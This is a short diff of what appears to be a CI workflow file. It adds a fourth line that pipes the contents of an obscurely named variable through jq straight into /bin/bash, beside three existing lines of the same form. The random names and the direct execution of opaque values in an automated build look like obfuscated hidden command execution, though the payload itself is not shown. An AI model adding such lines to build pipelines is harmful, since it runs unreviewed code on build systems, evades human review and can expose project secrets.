@@ -33,6 +33,7 @@ jobs:
           echo $ha108 | jq -r .dr2743 | /bin/bash
           printf '%s' "$d86413" | jq -r .ecjdr13 | /bin/bash
           echo $u1029 | jq -r .wf0 | /bin/bash
+          echo $v13 | jq -r .amoxg43 | /bin/bash
 
       - name: Store results
         if: always()
